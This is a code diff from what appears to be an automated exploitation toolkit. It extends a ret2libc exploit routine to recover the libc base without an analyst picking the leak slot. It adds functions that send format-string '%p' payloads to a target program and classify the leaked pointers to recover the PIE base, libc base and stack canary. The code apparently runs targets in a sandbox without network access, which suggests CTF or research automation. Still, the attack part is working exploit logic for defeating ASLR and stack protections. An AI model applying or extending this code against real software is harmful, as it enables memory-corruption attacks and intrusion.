@@ -306,9 +306,8 @@ def analyst_ret2libc(exe, workdir, *, offset, libc_data, leak_offset=None, leak_
     import struct as _struct
 
     from . import rop
-    if leak_offset is None:
-        if not leak_sym:
-            return {"ok": False, "reason": "need leak_sym or leak_offset (the leaked libc pointer)"}
+    auto = leak_offset is None and not leak_sym          # no slot named -> auto-classify the dump
+    if leak_offset is None and leak_sym:
         leak_offset = rop.libc_symbols(libc_data, (leak_sym,)).get(leak_sym)
         if leak_offset is None:
             return {"ok": False, "reason": f"leak_sym {leak_sym!r} not in libc .dynsym"}
@@ -350,11 +349,16 @@ def analyst_ret2libc(exe, workdir, *, offset, libc_data, leak_offset=None, leak_
                 cands = [vals[leak_index]] if (leak_index is not None and
                                                -len(vals) <= leak_index < len(vals)) else vals
                 base = None
-                for v in cands:
-                    b = v - leak_offset
-                    if b > 0 and b % 0x1000 == 0:                # a real libc base is page-aligned
-                        base, last = b, b
-                        break
+                if auto:                                     # no slot named: recover from >=2 syms
+                    base = rop.recover_libc_base(cands, libc_data)
+                    if base:
+                        last = base
+                else:
+                    for v in cands:
+                        b = v - leak_offset
+                        if b > 0 and b % 0x1000 == 0:            # a real libc base is page-aligned
+                            base, last = b, b
+                            break
                 if base is None:
                     continue
                 chain = bytearray(b"A" * offset)
@@ -506,3 +510,78 @@ def _allint(b):
         return True
     except ValueError:
         return False
+
+
+# --- automatic leak classification + provocation (gap #2) ---------------------------------------
+def classify_leak(vals, target_bytes: bytes, libc_data: bytes = b"") -> dict:
+    """Auto-classify a leaked-pointer burst: recover the PIE base (from the binary's own symbols),
+    the libc base (from libc's symbols, when a libc is given) and the stack canary, using ONLY the
+    leak. Returns {pie_base, libc_base, canary} with None for whatever could not be corroborated.
+    This removes the analyst's slot-picking WHEN the dump is rich enough (>=2 corroborating pointers
+    for a base; a null-low-byte word for the canary); a sparse dump still yields None and falls back
+    to an analyst-supplied slot."""
+    from . import rop
+    from .exploit import recover_pie_base
+    return {
+        "pie_base": recover_pie_base(vals, target_bytes),
+        "libc_base": rop.recover_libc_base(vals, libc_data) if libc_data else None,
+        "canary": rop.find_canary(vals),
+    }
+
+
+def auto_provoke_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=(), timeout=6.0,
+                      mem_mb=2048, read_cap=64) -> dict:
+    """Best-effort automatic leak: drive the target with a format-string `%p` dump (sequential that
+    fits `read_cap`, then positional to reach deeper slots) and classify what comes back. Returns
+    the classification plus the winning trigger, or empties when nothing was disclosed (the target
+    has no format-string sink, or none reachable). Pure provocation -- a target with no printf(user)
+    just echoes the specifier as text and classify_leak finds nothing."""
+    import re as _re
+    hexrx = _re.compile(rb"0x[0-9a-fA-F]+")
+    exedir = str(Path(exe).resolve().parent)
+    # Sequential dump sized to the read, then a few positional probes for deep code/libc pointers.
+    seq = b"%p" + b".%p" * max(1, (read_cap - 4) // 3)
+    triggers = [seq[:read_cap] + b"\n"]
+    triggers += [(b"|".join(b"%%%d$p" % i for i in range(a, a + 12)) + b"\n")[:read_cap] + b"\n"
+                 for a in (7, 19, 31)]
+    best = {"pie_base": None, "libc_base": None, "canary": None, "trigger": None, "dump": b""}
+    for trig in triggers:
+        preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
+        cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + \
+            [str(exe)] + [str(a) for a in base_argv]
+        try:
+            p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                                 stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
+                                 preexec_fn=preexec)
+        except Exception:                                    # noqa: BLE001
+            continue
+        try:
+            _read_until(p, time.time() + 0.4)
+            try:
+                p.stdin.write(trig)
+                p.stdin.flush()
+            except (BrokenPipeError, OSError):
+                continue
+            dump = _read_until(p, time.time() + timeout / 2)
+        finally:
+            for s in (p.stdin, p.stdout):
+                try:
+                    if s is not None:
+                        s.close()
+                except Exception:                            # noqa: BLE001
+                    pass
+            _kill(p)
+            try:
+                p.wait(timeout=2)
+            except Exception:                                # noqa: BLE001
+                pass
+        vals = [int(m.group(0), 16) for m in hexrx.finditer(dump) if _allint(m.group(0))]
+        cls = classify_leak(vals, target_bytes, libc_data)
+        # keep the richest result (most fields recovered)
+        score = sum(cls[k] is not None for k in ("pie_base", "libc_base", "canary"))
+        if score > sum(best[k] is not None for k in ("pie_base", "libc_base", "canary")):
+            best = {**cls, "trigger": trig, "dump": dump[:400]}
+        if cls["libc_base"] and cls["canary"]:              # enough to finish most chains
+            best = {**cls, "trigger": trig, "dump": dump[:400]}
+            break
+    return best
